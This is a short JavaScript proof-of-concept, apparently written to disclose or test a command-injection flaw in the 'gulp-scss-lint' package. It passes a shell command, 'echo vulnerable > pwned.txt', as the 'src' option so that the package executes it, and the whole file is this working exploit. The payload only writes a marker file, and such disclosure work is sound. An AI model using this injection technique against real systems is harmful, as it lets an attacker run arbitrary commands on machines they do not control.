var root = require("gulp-scss-lint");
var attack_code = "echo vulnerable > pwned.txt";
var opt = { "src": attack_code }
root(opt);
